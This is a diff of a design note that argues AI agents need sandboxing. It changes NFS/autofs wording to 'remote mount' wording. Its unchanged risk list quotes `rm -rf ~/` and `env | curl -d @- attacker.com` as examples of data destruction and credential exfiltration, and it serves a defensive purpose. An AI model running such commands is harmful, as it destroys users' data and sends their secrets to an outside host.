@@ -9,7 +9,7 @@ author:        Frederick Bloom
 copyright:     (c) 2026-* Frederick Bloom
 description: >
   Driver: AI agents executing on bare host systems create catastrophic risk —
-  data destruction, credential exfiltration, privilege escalation, NFS storms.
+  data destruction, credential exfiltration, privilege escalation, remote mount storms.
 ---
 
 # UncontainedAgentExecution: Driver (Root Cause)
@@ -19,7 +19,7 @@ description: >
 AI agents must call shell commands to be useful. Without a sandbox:
 - Any hallucinated `rm -rf ~/` destroys work
 - `env | curl -d @- attacker.com` exfiltrates all credentials
-- Accessing `/homes` on NFS hosts triggers autofs storms (30s hangs × N users)
+- Accessing unshadowed `/homes` triggers remote mount storms (30s hangs × N users)
 - Writing to `/etc` corrupts system state
 
 These are not theoretical risks — they are realized daily in unguarded agentic pipelines.
@@ -31,7 +31,7 @@ graph TD
     RC1[Agent executes as host user] --> E1[Can write to all host-owned files]
     RC2[Agent inherits full env] --> E2[Has access to API keys, DB creds]
     RC3[Agent has full network] --> E3[Can exfiltrate data or download malware]
-    RC4[Host /homes is autofs] --> E4[Any ls /homes/X triggers 30s NFS mount]
+    RC4[Host /homes is unshadowed] --> E4[Any ls /homes/X triggers 30s remote mount]
     E1 & E2 & E3 & E4 --> RISK[Catastrophic Production Risk]
 ```
 
